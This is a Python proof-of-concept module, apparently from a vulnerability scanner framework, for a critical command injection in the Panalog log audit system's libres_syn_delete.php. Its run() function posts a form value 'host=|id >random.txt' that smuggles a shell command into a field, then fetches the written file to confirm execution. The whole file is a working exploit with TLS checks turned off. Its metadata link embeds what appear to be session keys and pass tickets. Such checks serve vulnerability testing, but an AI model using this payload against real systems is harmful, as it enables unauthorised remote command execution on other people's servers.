#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s?__biz=MzIzOTM2MzczNQ==&mid=2247484242&idx=1&sn=814cfe9ef1b7e122ec1f42d26b8c8064&chksm=e88f1f8e983fea9851de7445ba4301fbc90f9ace00f3e850906b995e46655fdcb523421498bc&scene=27&key=200f9e9e1b7be3f459dc8151237019265b7991aaac0a41c697b022d3715aca9683cc5510af7729b6d1f8425105b9ae46138fb18688bb53484dc0f8e0c775e546aae22178fcf6dc1f3301840b18bf8bc5cce3767f300bfe646ca8df8f96871c541ada8415ab3c9b7e984892e2b23f385e63b1ee2513cdd93881f540f28458486d&ascene=15&uin=NTY2NTA4NjQ%3D&devicetype=Windows+10+x64&version=63060012&lang=zh_CN&session_us=gh_f21087ab2dc6&countrycode=AL&exportkey=n_ChQIAhIQeE9qwIq01PitB1tDBC%2B4gRLuAQIE97dBBAEAAAAAAJNJB6UqY74AAAAOpnltbLcz9gKNyK89dVj0kVRJ1jSB8HMQMGYmcYyNdEfOlabWOBfxXO5pV6n7psGsTBn3Tbv9HCYkYu8P%2FadZB4CZ%2Btyj2v3JwKBeKdL7R7t29%2FGkEunJT4SMnfCs6nNeJ7Wr7IaxCAli9XXF9wu4Z0ebzvcl4vlRm5Ak%2BKtplLL3SpcLilu0Ri16vFuFoHApSnv%2Bchi6%2FC4YULdHbepBi7Ckf2igqN9I%2FA%2BLiJSqk2M%2FdzLUXwMBC5yTTQ5i6tRSB5T3YLCP8pFLomQtLuizx54Jq0LvdEY%3D&acctmode=0&pass_ticket=y7RfsoNdKD2DrMb1N9n6In7Mw9MtehGhG1FvpIJAO%2B%2BamOfPJDhrtG4ojSBdDAcWuFj8eLL9e7xQ4IsHl30aWg%3D%3D&wx_header=0&fontgear=2',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Panalog日志审计系统 libres_syn_delete.php命令执行',

      'level'     :   'critical',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/2/19',
  }
  return ret
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def run(url,ua):
  ret = msg()
  r0 = randomLowercase(5)
  headers = {
      'User-Agent': ua,
      'Accept': '*/*',
      'Accept-Encoding': 'gzip, deflate',
      'Connection': 'close',
      'Content-Type': 'application/x-www-form-urlencoded',
      }
  data = f'token=1&id=2&host=|id >{r0}.txt'
  target = '/content-apply/libres_syn_delete.php'
  poc_target = f'/content-apply/{r0}.txt'
  url1 = url + target
  url2= url + poc_target
  ret['url'] = url2
  # print(url2)
  try:
    resp=requests.post(url=url1,headers=headers,data=data,timeout=10,verify=False)
    # print(resp.text)
    if resp.status_code == 200 and re.search(r'yes.*?ok',resp.text,re.S|re.I):
      pass
    else:
      return ret
  except:
    return ret
  try:
    headers= {'User-Agent': ua}
    res=requests.get(url=url2,headers=headers,timeout=10,verify=False)
    if res.status_code == 200 and re.search(r'uid.*?gid.*?groups.*?',res.text,re.S):
      ret['huixian'] = url2
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret